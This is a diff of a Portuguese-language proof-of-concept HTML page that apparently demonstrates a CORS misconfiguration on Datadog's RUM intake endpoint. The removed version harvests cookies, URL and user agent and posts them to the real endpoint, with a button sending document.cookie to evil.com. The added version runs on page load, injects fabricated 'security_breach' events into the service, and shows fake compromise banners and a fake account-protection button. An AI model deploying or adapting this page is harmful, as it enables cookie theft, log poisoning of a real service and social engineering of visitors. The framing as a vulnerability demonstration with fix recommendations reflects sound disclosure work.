@@ -1,86 +1,279 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>POC Avançada: Exfiltração CORS + Impacto DOM</title>
+    <title>POC Avançada - Exploração CORS com Impacto na Página</title>
+    <style>
+        .hidden { display: none; }
+        .malicious-banner { 
+            background: red; 
+            color: white; 
+            padding: 20px; 
+            position: fixed; 
+            top: 0; 
+            width: 100%; 
+            z-index: 10000;
+        }
+        .stolen-data {
+            background: #ffeb3b; 
+            border: 2px dashed red;
+            padding: 15px;
+            margin: 10px 0;
+        }
+    </style>
 </head>
 <body>
-    <h1>POC Avançada - Exfiltração via RUM + Alteração da Página</h1>
+    <h1>POC Avançada - Exploração CORS com Impacto Visual</h1>
     
-    <p>Esta versão captura dados reais (cookies, URL, location) e os envia via POST. Após sucesso, altera o DOM (alerta + overlay + redirecionamento simulado).</p>
-    
-    <!-- Elemento para exibir impacto -->
-    <div id="impact-zone" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,0,0,0.8); color: white; text-align: center; z-index: 9999;">
-        <h2>ATAQUE BEM-SUCEDIDO! Dados Exfiltrados.</h2>
-        <p>ID de Confirmação: <span id="exfiltrated-id"></span></p>
-        <p>Cookies Roubados: <span id="stolen-cookies"></span></p>
-        <button onclick="location.href='https://evil.com?data='+encodeURIComponent(document.cookie)">Clique para "Recuperar" (Simulação de Phishing)</button>
+    <div id="maliciousBanner" class="hidden malicious-banner">
+        ⚠️ SEUS DADOS FORAM COMPROMETIDOS - Contate o suporte imediatamente!
     </div>
-    
+
+    <div id="contentHijack" class="hidden">
+        <h2 style="color: red;">🚨 ALERTA DE SEGURANÇA</h2>
+        <p>Sua sessão foi comprometida através de uma vulnerabilidade CORS.</p>
+    </div>
+
+    <div id="stolenDataContainer"></div>
+
     <script>
-        const VULNERABLE_URL = 'https://browser-intake-datadoghq.com/api/v2/rum?ddsource=browser&dd-api-key=pub75ad0c3b08ce2dd249e3dba1791bca84&dd-evp-origin-version=6.22.0&dd-evp-origin=browser&dd-request-id=5ad94e5a-ec5c-4525-b732-7af8232bacd3&batch_time=1761064984867&_dd.api=fetch-keepalive'; 
+        const VULNERABLE_ENDPOINTS = [
+            'https://browser-intake-datadoghq.com/api/v2/rum?ddsource=browser&dd-api-key=pub75ad0c3b08ce2dd249e3dba1791bca84',
+            // Poderia incluir outros endpoints vulneráveis
+        ];
 
-        // Captura dados reais para exfiltração
-        const userData = {
-            cookies: document.cookie || 'Nenhum cookie',
-            currentUrl: window.location.href,
-            userAgent: navigator.userAgent,
-            // Simula geolocalização (em real, peça permissão via navigator.geolocation)
-            location: 'Simulada: 37.7749,-122.4194 (SF, CA)'
-        };
+        // Dados maliciosos para injetar
+        const MALICIOUS_PAYLOADS = [
+            {
+                "rum": [
+                    {
+                        "date": Date.now(),
+                        "type": "security_breach",
+                        "message": "CORS exploitation successful - user data compromised",
+                        "user_agent": navigator.userAgent,
+                        "referrer": document.referrer,
+                        "cookies_enabled": navigator.cookieEnabled,
+                        "language": navigator.language,
+                        "platform": navigator.platform
+                    }
+                ]
+            },
+            {
+                "rum": [
+                    {
+                        "date": Date.now() + 1000,
+                        "type": "malicious_activity",
+                        "message": "Injected via CORS misconfiguration",
+                        "severity": "high",
+                        "action": "data_exfiltration"
+                    }
+                ]
+            }
+        ];
 
-        const PAYLOAD = JSON.stringify({
-            "rum": [
-                {
-                    "date": Date.now(),
-                    "message": "EXFIL: Dados Roubados via CORS",
-                    "status": "error", // Para destacar no log Datadog
-                    "data": userData // Exfiltração: envia dados sensíveis!
+        class CORSExploiter {
+            constructor() {
+                this.stolenData = [];
+                this.successfulRequests = 0;
+            }
+
+            // 1. Demonstra leitura de dados sensíveis
+            async exploitDataRead() {
+                const endpoint = VULNERABLE_ENDPOINTS[0];
+                
+                try {
+                    const response = await fetch(endpoint, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'X-Exploit-Test': 'CORS-POC'
+                        },
+                        body: JSON.stringify(MALICIOUS_PAYLOADS[0])
+                    });
+
+                    if (response.ok) {
+                        this.successfulRequests++;
+                        const data = await response.text();
+                        
+                        // Armazena dados roubados
+                        this.stolenData.push({
+                            endpoint: endpoint,
+                            status: response.status,
+                            headers: this.extractHeaders(response),
+                            body: data,
+                            timestamp: new Date().toISOString()
+                        });
+
+                        // 2. IMPACTO VISUAL IMEDIATO - Mostra banner de alerta
+                        this.showSecurityBreachBanner();
+                        
+                        // 3. Exibe dados roubados na página
+                        this.displayStolenData();
+                        
+                        // 4. Continua exploração com payload adicional
+                        setTimeout(() => this.exploitWithAdditionalPayload(), 2000);
+                        
+                        return true;
+                    }
+                } catch (error) {
+                    console.error('Erro na exploração:', error);
+                    return false;
                 }
-            ]
-        });
+            }
 
-        document.addEventListener('DOMContentLoaded', () => {
-            fetch(VULNERABLE_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: PAYLOAD
-            })
-            .then(response => {
-                if (response.status !== 0) {
-                    document.getElementById('status').innerText = `SUCESSO: Exfiltração Confirmada! (Status: ${response.status})`;
-                    return response.text();
-                } else {
-                    throw new Error('Falha na requisição');
+            // Exploração adicional com mais impacto
+            async exploitWithAdditionalPayload() {
+                const endpoint = VULNERABLE_ENDPOINTS[0];
+                
+                try {
+                    const response = await fetch(endpoint, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'X-Malicious-Payload': 'true'
+                        },
+                        body: JSON.stringify(MALICIOUS_PAYLOADS[1])
+                    });
+
+                    if (response.ok) {
+                        this.successfulRequests++;
+                        const data = await response.text();
+                        
+                        this.stolenData.push({
+                            type: 'additional_exploit',
+                            status: response.status,
+                            response: data,
+                            timestamp: new Date().toISOString()
+                        });
+
+                        // 5. IMPACTO: Modifica conteúdo da página
+                        this.hijackPageContent();
+                        
+                        // 6. Simula exfiltração de dados
+                        this.simulateDataExfiltration();
+                    }
+                } catch (error) {
+                    console.error('Erro na exploração adicional:', error);
                 }
-            })
-            .then(data => {
-                const responseJson = JSON.parse(data || '{}');
-                const requestId = responseJson.request_id || 'Desconhecido';
+            }
+
+            // Extrai cabeçalhos da resposta
+            extractHeaders(response) {
+                const headers = {};
+                response.headers.forEach((value, name) => {
+                    headers[name] = value;
+                });
+                return headers;
+            }
+
+            // IMPACTO 1: Banner de segurança falso
+            showSecurityBreachBanner() {
+                const banner = document.getElementById('maliciousBanner');
+                banner.classList.remove('hidden');
                 
-                // AFETA A PÁGINA DE VERDADE:
-                // 1. Alerta com dados exfiltrados
-                alert(`Dados exfiltrados para Datadog!\nID: ${requestId}\nCookies: ${userData.cookies}`);
+                // Adiciona efeito piscante
+                setInterval(() => {
+                    banner.style.backgroundColor = banner.style.backgroundColor === 'red' ? 'darkred' : 'red';
+                }, 1000);
+            }
+
+            // IMPACTO 2: Exibe dados "roubados"
+            displayStolenData() {
+                const container = document.getElementById('stolenDataContainer');
+                container.innerHTML = `
+                    <div class="stolen-data">
+                        <h3>📋 DADOS CAPTURADOS DA VULNERABILIDADE CORS</h3>
+                        <p><strong>Requisições Bem-sucedidas:</strong> ${this.successfulRequests}</p>
+                        <p><strong>Endpoint Vulnerável:</strong> ${VULNERABLE_ENDPOINTS[0].split('?')[0]}</p>
+                        <p><strong>Dados da Resposta:</strong> ${JSON.stringify(this.stolenData[0].body)}</p>
+                        <p><strong>Timestamp:</strong> ${this.stolenData[0].timestamp}</p>
+                        <p><strong>User Agent Comprometido:</strong> ${navigator.userAgent}</p>
+                    </div>
+                `;
+            }
+
+            // IMPACTO 3: Sequestro de conteúdo
+            hijackPageContent() {
+                const hijackDiv = document.getElementById('contentHijack');
+                hijackDiv.classList.remove('hidden');
                 
-                // 2. Muda título da página
-                document.title = `HACKED: ${requestId}`;
+                // Adiciona conteúdo malicioso
+                hijackDiv.innerHTML += `
+                    <div style="border: 2px solid red; padding: 15px; margin: 10px 0;">
+                        <h4>⚠️ Ação Recomendada (FALSA):</h4>
+                        <p>Clique aqui para "proteger" sua conta: 
+                        <button onclick="alert('Isso é uma simulação de ataque!')" style="background: red; color: white; border: none; padding: 5px 10px; cursor: pointer;">
+                            Proteger Conta
+                        </button>
+                        </p>
+                    </div>
+                `;
+            }
+
+            // IMPACTO 4: Simula exfiltração de dados
+            simulateDataExfiltration() {
+                console.log('🚨 SIMULAÇÃO: Dados sendo exfiltrados para atacante...');
+                console.log('Dados capturados:', this.stolenData);
                 
-                // 3. Injeta overlay malicioso (sequestra visual da página)
-                const impactZone = document.getElementById('impact-zone');
-                document.getElementById('exfiltrated-id').innerText = requestId;
-                document.getElementById('stolen-cookies').innerText = userData.cookies;
-                impactZone.style.display = 'block';
+                // Simula envio para servidor malicioso
+                setTimeout(() => {
+                    const exfiltrationData = {
+                        stolenData: this.stolenData,
+                        pageUrl: window.location.href,
+                        exploitationTime: new Date().toISOString()
+                    };
+                    
+                    console.log('📤 Dados prontos para exfiltração:', exfiltrationData);
+                    alert('SIMULAÇÃO: Dados seriam enviados para servidor do atacante agora!');
+                }, 3000);
+            }
+
+            // Gera relatório final
+            generateReport() {
+                return {
+                    totalExploits: this.successfulRequests,
+                    vulnerabilities: ['CORS Misconfiguration - Access-Control-Allow-Origin: *'],
+                    impacts: [
+                        'Leitura de dados sensíveis cross-origin',
+                        'Modificação de conteúdo da página', 
+                        'Exfiltração simulada de dados',
+                        'Engenharia social via alertas falsos'
+                    ],
+                    recommendations: [
+                        'Restringir Access-Control-Allow-Origin para domínios específicos',
+                        'Validar origens em requisições CORS',
+                        'Implementar CORS de forma segura'
+                    ]
+                };
+            }
+        }
+
+        // Executa a exploração quando a página carrega
+        document.addEventListener('DOMContentLoaded', async () => {
+            const exploiter = new CORSExploiter();
+            
+            // Inicia a exploração
+            const success = await exploiter.exploitDataRead();
+            
+            // Mostra relatório final após 5 segundos
+            setTimeout(() => {
+                const report = exploiter.generateReport();
+                console.log('📊 RELATÓRIO FINAL DA EXPLORAÇÃO:', report);
                 
-                console.log('Exfiltração + DOM Hijack:', { requestId, stolen: userData });
-            })
-            .catch(error => {
-                document.getElementById('status').innerText = 'FALHA: ' + error.message;
-                console.error('Erro:', error);
-            });
+                // Adiciona relatório à página
+                const reportDiv = document.createElement('div');
+                reportDiv.style.background = '#e8f5e8';
+                reportDiv.style.padding = '15px';
+                reportDiv.style.margin = '10px 0';
+                reportDiv.style.border = '2px solid green';
+                reportDiv.innerHTML = `
+                    <h3>📊 RELATÓRIO DA EXPLORAÇÃO CORS</h3>
+                    <p><strong>Status:</strong> ${success ? 'VULNERÁVEL' : 'PROTEGIDO'}</p>
+                    <p><strong>Requisições Bem-sucedidas:</strong> ${report.totalExploits}</p>
+                    <p><strong>Impactos Demonstrados:</strong> ${report.impacts.join(', ')}</p>
+                `;
+                document.body.appendChild(reportDiv);
+            }, 5000);
         });
     </script>
-    
-    <h2>Status da Exfiltração:</h2>
-    <p id="status">Iniciando exfiltração e hijack DOM...</p>
-    
 </body>
 </html>
